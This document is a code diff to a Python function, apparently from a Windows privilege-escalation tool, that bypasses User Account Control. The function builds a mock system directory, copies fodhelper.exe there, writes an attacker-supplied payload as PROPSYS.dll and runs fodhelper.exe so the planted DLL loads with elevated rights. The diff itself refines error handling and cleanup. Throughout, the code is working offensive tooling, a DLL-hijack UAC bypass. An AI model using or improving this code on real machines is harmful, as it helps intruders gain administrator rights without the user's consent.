@@ -87,8 +87,10 @@ def uac_mockdir(payload):
 				print_warning("Directory already exists ({path}) using existing one".format(path=d))
 			except Exception:
 				print_error("Unable to create directory ({error})".format(error=error))
-				if "error" in Constant.output:
-					uac_mockdir_cleanup()
+				for x in Constant.output:
+					if "error" in x:
+						uac_mockdir_cleanup(path)
+						return False
 			else:
 				print_success("Successfully created directory ({path})".format(path=d))
 
@@ -100,8 +102,10 @@ def uac_mockdir(payload):
 								"fodhelper.exe"), os.path.join(dirs[1], "fodhelper.exe"))
 			except Exception:
 				print_error("Unable to copy fodhelper.exe to directory ({path})".format(path=dirs[1]))
-				if "error" in Constant.output:
-					uac_mockdir_cleanup()
+				for x in Constant.output:
+					if "error" in x:
+						uac_mockdir_cleanup(path)
+						return False
 			else:
 				print_success("Successfully copied fodhelper.exe to directory ({path})".format(path=dirs[1]))
 
@@ -109,8 +113,10 @@ def uac_mockdir(payload):
 			payload_data = open(os.path.join(payload), "rb").read()
 		except Exception:
 			print_error("Unable to read payload data")
-			if "error" in Constant.output:
-				uac_mockdir_cleanup()
+			for x in Constant.output:
+				if "error" in x:
+					uac_mockdir_cleanup(path)
+					return False
 
 		try:
 			dll_file = open(os.path.join(dirs[1], "PROPSYS.dll"), "wb")
@@ -118,8 +124,10 @@ def uac_mockdir(payload):
 			dll_file.close()
 		except Exception:
 			print_error("Unable to write payload to ({path})".format(path=os.path.join(dirs[1], "PROPSYS.dll")))
-			if "error" in Constant.output:
-				uac_mockdir_cleanup()
+			for x in Constant.output:
+				if "error" in x:
+					uac_mockdir_cleanup(path)
+					return False
 		else:
 			print_success("Successfully wrote payload to ({path})".format(path=os.path.join(dirs[1], "PROPSYS.dll")))
 
@@ -128,10 +136,14 @@ def uac_mockdir(payload):
 			print_success("Successfully disabled file system redirection")
 			if process().create(os.path.join(dirs[1], "fodhelper.exe"), window=True, get_exit_code=False):
 				print_success("Successfully executed ({path})".format(path=os.path.join(dirs[1], "fodhelper.exe")))
+				time.sleep(5)
+				uac_mockdir_cleanup()
 			else:
-				print_success("Unable to execute ({path})".format(path=os.path.join(dirs[1], "fodhelper.exe")))
-				if "error" in Constant.output:
-					uac_mockdir_cleanup()
-
-		if uac_mockdir_cleanup():
-			print_success("All done!")
+				print_error("Unable to execute ({path})".format(path=os.path.join(dirs[1], "fodhelper.exe")))
+				for x in Constant.output:
+					if "error" in x:
+						uac_mockdir_cleanup(path)
+						return False
+	else:
+		print_error("Cannot proceed, invalid payload")
+		return False
